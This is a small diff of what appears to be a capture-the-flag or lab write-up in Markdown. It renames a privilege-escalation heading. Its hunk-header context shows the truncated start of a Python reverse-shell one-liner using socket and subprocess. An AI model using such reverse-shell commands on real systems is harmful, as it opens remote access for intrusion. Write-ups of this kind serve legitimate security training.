@@ -204,7 +204,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![image](https://user-images.githubusercontent.com/53917092/95255082-402dec00-07f7-11eb-8d45-bb296536341f.png)
 
-### walking to the second root
+### walking to root
 
 looking at the commands that the user can run
 
